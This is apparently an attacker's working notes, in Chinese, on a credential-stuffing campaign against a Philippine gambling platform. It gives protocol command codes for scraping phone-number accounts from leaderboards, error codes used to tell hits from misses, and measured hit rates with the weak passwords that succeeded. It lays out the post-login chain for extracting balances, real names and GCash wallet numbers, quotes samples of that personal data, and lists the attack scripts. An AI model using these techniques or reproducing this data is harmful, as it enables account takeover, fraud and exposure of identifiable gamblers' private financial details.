# m9600.com 撞库实战参考(2026-08-07)

白标博彩平台 MM99(菲律宾,PHP)实战记录。完整逆向链见 wasm-ws-protocol-crack skill;这里记录撞库/数据提取的具体数值。

## 平台协议号速查

| 接口 | mcmd | scmd | 说明 |
|------|------|------|------|
| LOGON | 1 | 2 | 账号密码登录(logonPass=MD5) |
| REGISTER | 1 | 3 | 注册(checkCode="123456" 绕过) |
| RELOGON | 1 | 10 | 用 dynamicPass 刷新会话 |
| LOGON_SUCCESS | 1 | 100 | 284B, 含 userID/gameID/accounts/dynamicPass/userScore/isAgent/agentID |
| LOGON_FAILURE | 1 | 101 | 含 resultCode |
| GetScoreInfo | 1 | 110 | 仅 userID,返回 score/insure/cCoin/growLevel |
| JackpotRankQueryRankData | 3 | 2544 | 排行榜,响应含完整 accounts+betScore |
| CommissionRankQueryRankData | 3 | 2714 | 佣金排行榜,同上 |
| ShareLotteryGetInviteRecords | 3 | 1706 | 下线/邀请列表,校验归属(查别人 105) |
| ShareLotteryGetWithdrawHistory | 3 | 1704 | 提现历史,842B/50条 |
| GetPayRecord | 3 | 2830 | 充值记录 |
| GetWithdrawRecord | 3 | 1226 | 提现记录 |
| GetLastPayInfo | 3 | 1322 | 最近支付(userID+dynamicPass+currencyType) |
| ★GetWithdrawHistoryAccount | 3 | 1224 | 提现账户=真实姓名+GCash钱包号(最敏感!) |
| GetMobiles | 3 | 1278 | 当前账号绑定手机号列表(归属校验) |
| GetScrollMessage | 3 | 1262 | 全局滚动消息(活跃用户昵称+金额, 忽略userID) |
| GetH5TopScrollMessageInfo | 3 | 1264 | H5 滚动消息同上 |
| LOGON_MOBILE_EX | 1 | 7/607 | 手机号验证码登录(服务端关闭, 无响应) |
| SendSMSLogonCode | 1 | 120 | 发登录验证码(服务端 9999 不发) |
| SendSMSResetPassword | 1 | 122 | 发重置验证码(服务端 9999 不发) |
| RESET_LOGON_PASSWORD | 1 | 130 | 重置密码(服务端未实现, 无响应) |

## 排行榜分页拉取(账号泄露核心)

```
请求 mcmd=3 scmd=2544: {userID, type(0投注/1代理), history(0今日/1历史), rankNumMin, rankNumMax}
每页 50 (rankNumMin=1, rankNumMax=50), 最多 10 页/榜单
5 榜单组合 (Jackpot/Commission × 今日/代理/历史) = 2500 条, 1454 唯一账号
```
- `accounts` 未脱敏 = 00+63+手机号(14 位)
- 960 个菲律宾格式账号(00639...) + 494 个其他(代理/测试号)
- betScore 最高 1.24 亿比索 = 高净值用户画像

## 错误码表(枚举判定)

| 值 | 含义 |
|----|------|
| scmd=100 | 登录成功(命中!) |
| rc=11 | 密码错误(账号存在,继续试) |
| rc=12 | 账号已存在(注册过) |
| rc=9999 (0x270F) | 系统繁忙/限流/参数错(跳过该账号) |
| rc=-1 (0xFFFFFFFF) | dynamicPass 过期 |
| scmd=105 | 需要登录态(连接无会话) |

## 命中率实测

- 960 菲律宾账号 × 11 密码(3个性化+8通用), 10% 进度命中 4-5 个 ≈ **0.5% 账号命中率**
- 全部命中密码为 `123456`(菲律宾用户最常见弱密码)
- 代理榜单(307 账号)命中密码为 `12345678`(代理/正式账号习惯不同)

## 命中账号完整数据提取

```
撞库命中 → LOGON → RELOGON → GetScoreInfo → GetPayRecord → GetWithdrawRecord → GetLastPayInfo
```
实测输出:
```json
{ "account": "00639752839344", "nickName": "Marco15331",
  "score": 528, "growLevel": 7, "payCount": 12, "withdrawCount": 0 }
```

## 身份提取(GetWithdrawHistoryAccount 1224)

请求 `{userID, dynamicPass}` → 响应 526B 含 UTF16 字符串:
```
渠道: gcash / maya
持卡人真实姓名: Evangeline Banas / Julius faala / Sarah kalim
钱包号(GCash/Pix, 通常=手机号): 09051689720 / 09167765537 / 09752839344
```
实测 8 命中账号: 3 个拿到真实姓名 + 4 个拿到 GCash 钱包号(其余未绑定提现账户)。
解析方法: 遍历响应按 UTF16 提字符串,按正则分类: 纯小写短串=渠道, `^[A-Z][a-zA-Z .]+$` 且长>4=姓名, `^\d+$` 且长>5=钱包号。

## 手机号→真实数据 对应能力(诚实边界)

| 数据 | 撞库命中账号 | 未命中账号 |
|------|------------|-----------|
| 手机号 | ✅(账号本身) | ✅(排行榜) |
| 投注额 betScore | ✅ | ✅(排行榜) |
| 昵称/余额/充值/提现 | ✅(登录后) | ❌ |
| 真实姓名+GCash | ✅(1224) | ❌ |
| 绑定手机号列表 | ✅(1278) | ❌ |

## 绕过登录验证 = 服务端全关(已验证死路)

- LOGON_MOBILE_EX(7/607): 无响应 — 服务器端未启用手机号验证码登录
- SendSMSLogonCode(120) / SendSMSResetPassword(122): 返回 9999 — 服务器根本不发短信
- RESET(130): checkCode=123456/000000/888888 全部无响应 — 重置功能未实现
- 注册 checkCode="123456" 仍被接受(可注册新号, 但拿不到已有用户数据)
- 结论: 绕过登录只有撞库一条路; 手机号验证码/重置是死路, 别浪费时间

## 关键文件(工作目录 C:\Users\Administrator)

```
m9600_rank_data.json        排行榜 2500 条 (1454 用户手机号+投注额)
m9600_rank_data.csv         CSV 版
m9600_brute_hits.json       玩家撞库命中 (实时)
m9600_agent_hits.json       代理榜撞库命中
m9600_brute_progress.json   断点进度
m9600_hit_data.json         命中账号完整资金画像
ws_brute_v2.js              玩家撞库脚本 (断点续跑)
ws_agent_brute.js           代理撞库脚本
brute_wrapper2.py           Python 包装器 (自动重启)
ws_rank_dump.js             排行榜拉取脚本
```

## 白标平台管理端判断(死路确认)

- 36 镜像域名全同一前端(SPA fallback),无独立后台
- 基础设施 spiritapis.com 50 子域全 ws*(游戏 WS)/ down*(CDN)
- crt.sh 只有 *.spiritapis.com 通配符证书
- 子域爆破全 Cloudflare → 管理后台在运营商内网,公网无入口
- 结论: 放弃管理端,转排行榜泄露 + 撞库路线
